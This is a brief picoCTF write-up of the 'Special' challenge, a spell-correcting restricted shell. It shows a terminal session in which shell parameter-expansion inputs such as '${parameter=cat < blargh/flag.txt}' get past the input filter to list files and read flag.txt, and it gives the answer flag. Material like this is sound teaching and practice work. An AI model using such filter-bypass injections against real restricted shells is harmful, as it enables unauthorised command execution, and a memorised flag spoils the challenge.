## Descripción:
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)Start your instance to see connection details.

# Solución
```bash
sh: 1: More: not found
Special$ less flag.txt
Less flag.txt 
sh: 1: Less: not found
Special$ ${parameter?ls}
${parameter?ls} 
sh: 1: parameter: ls
Special$ ${parameter=ls blargh}
${parameter=ls blargh} 
flag.txt
Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_a60bdf40}Special$ ^CTraceback (most recent call last):
  File "/usr/local/Special.py", line 11, in <module>
    cmd = input("Special$ ")
KeyboardInterrupt
Connection to saturn.picoctf.net closed.
MpaulaCG-picoctf@webshell:~$ 
```
Respuesta`picoCTF{5p311ch3ck_15_7h3_w0r57_a60bdf40}`

## Notas

## Referencias
 